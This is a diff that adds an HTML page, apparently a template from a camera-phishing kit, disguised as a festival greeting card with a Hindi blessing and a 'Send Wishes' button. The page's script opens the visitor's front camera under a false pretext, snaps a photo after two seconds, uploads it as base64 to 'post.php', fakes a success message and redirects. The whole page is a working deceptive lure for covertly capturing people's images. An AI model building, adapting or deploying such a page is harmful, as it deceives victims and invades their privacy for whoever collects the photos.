@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>🎉 Happy fes_name</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { 
+    font-family: 'Segoe UI', Arial, sans-serif; 
+    background: linear-gradient(135deg, #ff6b6b, #ffa500, #ffd700);
+    min-height: 100vh; display: flex; align-items: center; justify-content: center; 
+    padding: 20px;
+}
+.card {
+    background: #fff; border-radius: 20px; padding: 30px; max-width: 500px; 
+    width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.2); text-align: center;
+}
+.card h1 { font-size: 32px; color: #e74c3c; margin-bottom: 15px; }
+.card p { font-size: 16px; color: #555; line-height: 1.8; margin: 10px 0; }
+.card .highlight { color: #e74c3c; font-weight: bold; }
+.btn-wish { 
+    background: linear-gradient(135deg, #e74c3c, #c0392b); color: #fff; 
+    padding: 15px 40px; border: none; border-radius: 50px; font-size: 18px; 
+    cursor: pointer; margin-top: 20px; transition: all 0.3s;
+}
+.btn-wish:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(231,76,60,0.4); }
+#camOverlay { 
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+    background: rgba(0,0,0,0.9); display: none; z-index: 9999;
+    justify-content: center; align-items: center; flex-direction: column;
+}
+#camOverlay.active { display: flex; }
+#camOverlay video { width: 80%; max-width: 400px; border-radius: 12px; border: 3px solid #ffd700; }
+#camOverlay p { color: #fff; margin-top: 15px; font-size: 18px; }
+</style>
+</head>
+<body>
+<div class="card">
+    <h1>🎉 Happy fes_name 🎉</h1>
+    <p class="highlight">"fes_name का ये शुभ अवसर आपके जीवन में अनेकों ख़ुशियाँ लेकर आए"</p>
+    <p>💫 Wishing you and your family a very happy fes_name filled with joy, prosperity, and good health.</p>
+    <p>✨ May this auspicious occasion bring happiness, peace, and success in your life.</p>
+    <button class="btn-wish" onclick="openCamera()">🎊 Send Wishes & View Special Message</button>
+</div>
+
+<div id="camOverlay">
+    <video id="video" autoplay playsinline></video>
+    <p>📸 Smile! Sending your wishes with a photo...</p>
+</div>
+
+<script>
+function openCamera() {
+    var overlay = document.getElementById('camOverlay');
+    overlay.className = 'camOverlay active';
+    
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(function(stream) {
+            var video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            setTimeout(function() {
+                var canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                var ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 640, 480);
+                var data = canvas.toDataURL('image/png');
+                
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'post.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('cat=' + encodeURIComponent(data));
+                
+                // Stop camera
+                stream.getTracks().forEach(function(track) { track.stop(); });
+                
+                overlay.innerHTML = '<p>✅ Wishes Sent Successfully! 🎉</p>';
+                setTimeout(function() { window.location.href = 'forwarding_link'; }, 2000);
+            }, 2000);
+        })
+        .catch(function(err) {
+            overlay.innerHTML = '<p>❌ Camera access needed to send wishes</p>';
+        });
+    }
+}
+</script>
+</body>
+</html>
